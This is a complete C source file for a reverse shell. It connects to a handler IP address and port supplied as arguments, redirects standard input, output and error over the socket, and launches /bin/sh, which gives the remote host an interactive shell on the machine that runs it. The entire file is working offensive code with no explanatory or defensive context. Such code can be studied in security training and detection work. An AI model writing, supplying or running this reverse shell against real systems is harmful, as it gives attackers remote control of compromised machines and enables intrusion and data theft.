#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <stdlib.h>

int main (int argc, char* argv[]) {
	// Handler IP Address
	const char* ip = argv[1];
	
	// Handler Listening Port
	int port = atoi(argv[2]);

	// Socket Address Struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	// Convert IP address to binary, network byte order format
	inet_aton(ip, &addr.sin_addr);

	// Socket creation and connecting to handler
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	// Duplicating STDERR, STDIN, STDOUT across socket file descriptor
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	// Command execution via execve
	execve("/bin/sh", NULL, NULL);

	return 0;
}
